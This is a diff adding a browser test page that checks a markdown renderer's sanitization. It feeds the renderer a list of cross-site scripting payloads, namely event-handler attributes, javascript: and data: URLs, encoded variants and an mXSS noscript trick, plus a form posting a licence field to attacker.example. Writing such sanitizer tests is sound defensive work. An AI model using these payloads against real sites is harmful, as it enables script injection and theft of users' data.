@@ -1,0 +1,90 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Sanitize test (running)</title>
+<!-- Same pinned scripts as frontend/index.html, plus the real frontend/render.js under test. -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/marked/12.0.2/marked.min.js" integrity="sha512-xeUh+KxNyTufZOje++oQHstlMQ8/rpyzPuM+gjMFYK3z5ILJGE7l2NvYL+XfliKURMpBIKKp1XoPN/qswlSMFA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.4.16/purify.min.js" integrity="sha512-flQmhkXNRQ3iUfvtdCobtpMjCb6kE+zLnTiAulAQJ3WykVfy84JvCMOo6vhwWXHTXjR25h9Zj+LyGFRWKjRoag==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script src="../../frontend/render.js"></script>
+<style>body{font-family:system-ui,sans-serif;margin:16px;background:#fff;color:#111} .fail{color:#b00020} .pass{color:#0a7a2f}</style>
+</head>
+<body>
+<h1>renderAssistantMarkdown regression tests</h1>
+<p>Open this file in a browser (with network access to cdnjs). The title becomes "PASS n/n" or "FAIL …".</p>
+<ul id="out"></ul>
+<div id="mount" hidden></div>
+<script>
+const results = [];
+function check(name, ok, detail){ results.push({ name, ok: !!ok, detail: detail || "" }); }
+function frag(html){ const t = document.createElement("template"); t.innerHTML = html; return t.content; }
+function hrefs(html){ return [...frag(html).querySelectorAll("[href],[src],[action],[formaction],[xlink\\:href]")]
+  .flatMap(el => ["href","src","action","formaction","xlink:href"].map(a => el.getAttribute(a)).filter(Boolean)); }
+function hasHandler(html){ return [...frag(html).querySelectorAll("*")].some(el => [...el.attributes].some(a => /^on/i.test(a.name))); }
+
+window.__xss = 0;
+const malicious = {
+  "script tag":            "<script>window.__xss++</" + "script>",
+  "img onerror":           '<img src="x" onerror="window.__xss++">',
+  "svg onload":            '<svg onload="window.__xss++"><circle r="1"/></svg>',
+  "div onclick":           '<div onclick="window.__xss++">click</div>',
+  "body onload":           '<body onload="window.__xss++">',
+  "iframe javascript src": '<iframe src="javascript:window.__xss++"></iframe>',
+  "html javascript link":  '<a href="javascript:window.__xss++">x</a>',
+  "mixed-case javascript": '<a href="JaVaScRiPt:window.__xss++">x</a>',
+  "entity-encoded javascript": '<a href="&#106;avascript:window.__xss++">x</a>',
+  "markdown javascript link": "[click me](javascript:window.__xss++)",
+  "form action javascript": '<form action="javascript:window.__xss++"><button>go</button></form>',
+  "form posting elsewhere": '<form action="https://attacker.example/collect"><input name="licence"><button>Verify</button></form>',
+  "data: html in iframe":  '<iframe src="data:text/html,<script>parent.__xss++</' + 'script>"></iframe>',
+  "style tag":             "<style>body{display:none}</style>text",
+  "object/embed":          '<object data="javascript:window.__xss++"></object><embed src="javascript:window.__xss++">',
+  "mXSS noscript":         '<noscript><p title="</noscript><img src=x onerror=window.__xss++>">',
+};
+const mount = document.getElementById("mount");
+for (const [name, input] of Object.entries(malicious)){
+  const html = renderAssistantMarkdown(input);
+  const bad = /<(script|iframe|object|embed|style|form|input|button|textarea|select)\b/i.test(html) || hasHandler(html) ||
+              hrefs(html).some(v => /^\s*(javascript|data|vbscript):/i.test(v));
+  check("blocks " + name, html !== null && !bad, html);
+  const el = document.createElement("div"); el.innerHTML = html; mount.appendChild(el);   // exactly what index.html does
+}
+
+const ordinary = [
+  ["bold",            "**Yes.** It is mandatory.", h => /<strong>Yes\.<\/strong>/.test(h)],
+  ["heading",         "### Penalty", h => /<h3[^>]*>Penalty<\/h3>/.test(h)],
+  ["bullet list",     "- one\n- two", h => /<ul>\s*<li>one<\/li>\s*<li>two<\/li>\s*<\/ul>/.test(h)],
+  ["numbered list",   "1. first\n2. second", h => /<ol>[\s\S]*<li>first<\/li>[\s\S]*<li>second<\/li>/.test(h)],
+  ["https link kept", "See [India Code](https://www.indiacode.nic.in/).", h => /<a href="https:\/\/www\.indiacode\.nic\.in\/">India Code<\/a>/.test(h)],
+  ["inline code",     "Use `Form H`.", h => /<code>Form H<\/code>/.test(h)],
+  ["code block escapes HTML", "```\n<b>not bold</b>\n```", h => /<pre><code[^>]*>&lt;b&gt;not bold&lt;\/b&gt;\n?<\/code><\/pre>/.test(h)],
+  ["table",           "| A | B |\n|---|---|\n| 1 | 2 |", h => /<table>[\s\S]*<th>A<\/th>[\s\S]*<td>2<\/td>[\s\S]*<\/table>/.test(h)],
+  ["line breaks (breaks: true)", "line one\nline two", h => /line one<br>\s*line two/.test(h)],
+  ["emphasis and rupee sign", "_Note:_ fine of ₹1,000", h => /<em>Note:<\/em> fine of ₹1,000/.test(h)],
+];
+for (const [name, input, ok] of ordinary){
+  const html = renderAssistantMarkdown(input);
+  check("keeps " + name, html !== null && ok(html), html);
+}
+
+// Fallback: if DOMPurify is unavailable, render.js must refuse rather than return raw HTML.
+const saved = window.DOMPurify; window.DOMPurify = undefined;
+check("returns null without DOMPurify", renderAssistantMarkdown("<img src=x onerror=1>") === null);
+window.DOMPurify = saved;
+
+setTimeout(() => {   // give any injected handler a chance to fire
+  check("no injected code executed", window.__xss === 0, "window.__xss = " + window.__xss);
+  const failed = results.filter(r => !r.ok);
+  document.title = failed.length ? `FAIL ${failed.length}/${results.length}` : `PASS ${results.length}/${results.length}`;
+  const out = document.getElementById("out");
+  for (const r of results){
+    const li = document.createElement("li"); li.className = r.ok ? "pass" : "fail";
+    li.textContent = (r.ok ? "PASS " : "FAIL ") + r.name + (r.ok ? "" : "  ->  " + r.detail);
+    out.appendChild(li);
+  }
+  window.__results = results;
+}, 500);
+</script>
+</body>
+</html>
